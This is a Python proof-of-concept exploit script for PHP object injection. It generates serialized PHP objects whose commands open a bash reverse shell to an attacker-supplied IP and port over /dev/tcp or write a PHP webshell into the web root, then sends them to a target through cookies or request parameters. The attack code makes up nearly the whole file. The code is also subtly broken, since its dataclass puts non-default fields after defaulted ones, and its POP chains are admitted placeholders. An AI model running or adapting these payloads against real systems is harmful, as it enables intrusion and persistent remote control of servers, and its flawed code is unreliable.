#!/usr/bin/env python3
"""
PHP Object Injection RCE PoC
CVE: Multiple (depends on application and POP chain)
Target: PHP applications using unserialize() on untrusted data
Vulnerability: PHP Object Injection → POP Chain → RCE

Reference:
- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
- https://www.evonide.com/how-we-broke-php-hacked-pornhub-and-earned-20000-dollar/
- https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf

Exploit Flow:
1. Identify unserialize() usage on user input (cookies, parameters)
2. Analyze source code for exploitable classes (magic methods)
3. Build Property-Oriented Programming (POP) chain
4. Generate serialized object with malicious properties
5. Trigger deserialization with crafted payload
6. Achieve RCE via __destruct, __wakeup, or __toString
"""

import argparse
import requests
import sys
import urllib.parse
from dataclasses import dataclass, field
from typing import Optional
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass(slots=True)
class ExploitContext:
    """PHP Object Injection exploit configuration and state."""

    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/"
    param_name: str = "data"
    delivery: str = "cookie"  # cookie, post, get

    attacker_ip: str
    attacker_port: int

    pop_chain: str = "generic"  # generic, wordpress, symfony
    command_type: str = "ping"
    proxy: Optional[str] = None

    session: requests.Session = field(default_factory=requests.Session, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            delivery=args.delivery,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            pop_chain=args.pop_chain,
            command_type=args.command,
            proxy=args.proxy,
        )

    def get_base_url(self) -> str:
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="PHP Object Injection RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic cookie-based injection
  %(prog)s 192.168.1.10 80 10.10.14.5 4444

  # POST parameter
  %(prog)s 192.168.1.10 80 10.10.14.5 4444 --delivery post --param-name user_data

  # WordPress POP chain
  %(prog)s 192.168.1.10 80 10.10.14.5 4444 --pop-chain wordpress
"""
    )

    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/", help="Vulnerable endpoint")
    target_group.add_argument("--param-name", default="data", help="Parameter name")
    target_group.add_argument("--delivery", choices=["cookie", "post", "get"], default="cookie")

    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP")
    attacker_group.add_argument("listening_port", type=int, help="Attacker port")

    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--pop-chain", choices=["generic", "wordpress", "symfony"], default="generic")
    exploit_group.add_argument("--command", choices=["ping", "reverse_shell", "webshell"], default="ping")

    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy")

    return parser.parse_args()

def generate_generic_pop_chain(ctx: ExploitContext) -> str:
    """Generate generic PHP object injection payload."""

    cmd = f"ping -c 4 {ctx.attacker_ip}"
    if ctx.command_type == "reverse_shell":
        cmd = f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"
    elif ctx.command_type == "webshell":
        cmd = f"echo '<?php system($_GET[c]); ?>' > /var/www/html/shell.php"

    # Generic POP chain using common PHP classes
    # This is a simplified example - real chains are application-specific
    payload = f'''O:9:"EvilClass":1:{{s:7:"command";s:{len(cmd)}:"{cmd}";}}'''

    return payload

def generate_wordpress_pop_chain(ctx: ExploitContext) -> str:
    """Generate WordPress-specific POP chain."""

    cmd = f"ping -c 4 {ctx.attacker_ip}"
    if ctx.command_type == "reverse_shell":
        cmd = f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"

    # WordPress POP chain example (simplified)
    payload = f'''O:8:"stdClass":1:{{s:4:"file";s:{len(cmd)}:"{cmd}";}}'''

    return payload

def stage_recon(ctx: ExploitContext) -> bool:
    print("\n[*] Stage 1: Reconnaissance")

    try:
        response = ctx.session.get(ctx.get_target_url(), proxies=ctx.get_proxies(), timeout=10, verify=False)
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        # Check for PHP indicators
        if "X-Powered-By" in response.headers:
            if "PHP" in response.headers["X-Powered-By"]:
                print(f"[+] PHP detected: {response.headers['X-Powered-By']}")

        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

def stage_generate_payload(ctx: ExploitContext) -> str:
    print("\n[*] Stage 2: Payload Generation")
    print(f"[*] POP Chain: {ctx.pop_chain}")
    print(f"[*] Command: {ctx.command_type}")

    if ctx.pop_chain == "wordpress":
        payload = generate_wordpress_pop_chain(ctx)
    else:
        payload = generate_generic_pop_chain(ctx)

    print(f"[*] Generated payload: {payload[:80]}...")
    return payload

def stage_exploit(ctx: ExploitContext, payload: str) -> bool:
    print("\n[*] Stage 3: Exploitation")
    print(f"[*] Delivery method: {ctx.delivery}")

    try:
        if ctx.delivery == "cookie":
            cookies = {ctx.param_name: payload}
            response = ctx.session.get(ctx.get_target_url(), cookies=cookies, proxies=ctx.get_proxies(), timeout=15, verify=False)
        elif ctx.delivery == "post":
            data = {ctx.param_name: payload}
            response = ctx.session.post(ctx.get_target_url(), data=data, proxies=ctx.get_proxies(), timeout=15, verify=False)
        else:  # get
            params = {ctx.param_name: payload}
            response = ctx.session.get(ctx.get_target_url(), params=params, proxies=ctx.get_proxies(), timeout=15, verify=False)

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        if "__wakeup" in response.text or "__destruct" in response.text or "unserialize" in response.text:
            print("[+] Deserialization indicators found in response")

        return True
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        return False

def main():
    print("[+] PHP Object Injection RCE PoC")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    POP Chain: {ctx.pop_chain}")
    print(f"    Delivery: {ctx.delivery}")

    try:
        if not stage_recon(ctx):
            sys.exit(1)

        payload = stage_generate_payload(ctx)

        if not stage_exploit(ctx, payload):
            sys.exit(1)

        print("\n[+] Exploitation completed")
        print(f"[!] Monitor for callbacks from {ctx.target_ip}")
        print(f"[!] Note: Real exploitation requires application-specific POP chains")

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
